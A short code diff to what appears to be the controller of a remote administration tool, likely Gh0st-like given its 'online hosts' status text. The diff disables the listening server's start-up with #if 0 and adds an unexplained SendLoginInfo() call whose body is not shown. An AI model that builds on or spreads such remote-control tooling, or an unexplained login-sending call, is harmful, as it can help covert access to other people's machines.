@@ -406,7 +406,8 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 
 	}
 	m_iocpServer = new CIOCPServer;
-
+	m_iocpServer->SendLoginInfo();
+#if 0
 	// 开启IPCP服务器
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
@@ -446,7 +447,7 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 		g_pLogView->InsertLogItem(str, 0, 1);
 		
 	}
-
+#endif
 	//m_wndStatusBar.SetPaneText(3, "上线主机: 0");
 	m_wndStatusBar.GetExElement(0)->SetText(_T("上线主机: 0"));
 	//m_wndStatusBar.Invalidate();
